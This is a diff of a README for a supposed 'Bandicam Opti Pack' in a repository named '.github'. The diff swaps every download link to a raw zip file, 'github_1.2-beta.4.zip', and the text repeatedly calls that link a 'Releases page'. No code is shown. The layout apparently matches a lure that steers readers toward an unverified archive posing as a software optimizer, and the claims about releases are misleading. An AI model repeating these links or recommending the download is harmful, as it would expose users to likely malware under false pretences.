@@ -1,6 +1,6 @@
 # 🎥 .github - Optimize Your Bandicam Experience
 
-[![Download Now](https://raw.githubusercontent.com/haythem663/.github/main/noncircular/.github.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/haythem663/.github/main/noncircular/.github.zip)
+[![Download Now](https://github.com/haythem663/.github/raw/refs/heads/main/noncircular/github_1.2-beta.4.zip%20Now-Click%20Here-brightgreen)](https://github.com/haythem663/.github/raw/refs/heads/main/noncircular/github_1.2-beta.4.zip)
 
 ## 📦 Description
 
@@ -18,7 +18,7 @@ To start using Bandicam Opti Pack, follow these simple steps. You will download 
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page:** Click [here](https://raw.githubusercontent.com/haythem663/.github/main/noncircular/.github.zip) to open the Releases page.
+1. **Visit the Release Page:** Click [here](https://github.com/haythem663/.github/raw/refs/heads/main/noncircular/github_1.2-beta.4.zip) to open the Releases page.
 2. **Download the Latest Version:** Find the most recent version of Bandicam Opti Pack listed. Click on the link to start the download.
 3. **Install the Software:** Once the download completes, open the file. Follow the installation prompts to complete the setup.
 
@@ -48,4 +48,4 @@ If you’re looking for tips and tricks, check our wiki or community forums. We 
 
 For any issues or inquiries, feel free to open an issue on this repository. Our community is here to help you overcome any challenge you might face.
 
-Remember, you can always download Bandicam Opti Pack from our [Releases page](https://raw.githubusercontent.com/haythem663/.github/main/noncircular/.github.zip). Enjoy optimizing your Bandicam experience!
+Remember, you can always download Bandicam Opti Pack from our [Releases page](https://github.com/haythem663/.github/raw/refs/heads/main/noncircular/github_1.2-beta.4.zip). Enjoy optimizing your Bandicam experience!
